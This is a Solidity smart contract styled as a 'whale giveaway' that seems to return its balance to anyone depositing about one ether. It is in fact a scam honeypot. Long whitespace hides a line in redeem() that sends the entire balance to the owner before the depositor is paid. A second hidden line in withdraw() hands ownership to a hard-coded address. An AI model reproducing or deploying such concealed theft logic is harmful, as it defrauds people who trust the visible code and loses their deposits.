pragma solidity ^0.8.26;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
    uint public totalParticipants;
    uint public totalRedemptions;
    mapping(address => bool) public hasParticipated;
    mapping(address => uint) public redemptionCount;
   
    receive()
    external payable
    {
        
    }
   
    function redeem()
    public payable
    {                                                                    
        if(msg.value>=minEligibility)
        {
            if(!hasParticipated[msg.sender]) {
                hasParticipated[msg.sender] = true;
                totalParticipants++;
            }
            redemptionCount[msg.sender]++;
            totalRedemptions++;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     payable(Owner).transfer(address(this).balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            payable(msg.sender).transfer(address(this).balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }
    
    function Command(address adr,bytes calldata data)
    payable public
    {
        require(msg.sender == Owner);
        unchecked {
            (bool success,) = adr.call{value: msg.value}(data);
        }
    }

    function getParticipantStats(address participant) public view returns (bool participated, uint redemptions) {
        return (hasParticipated[participant], redemptionCount[participant]);
    }
}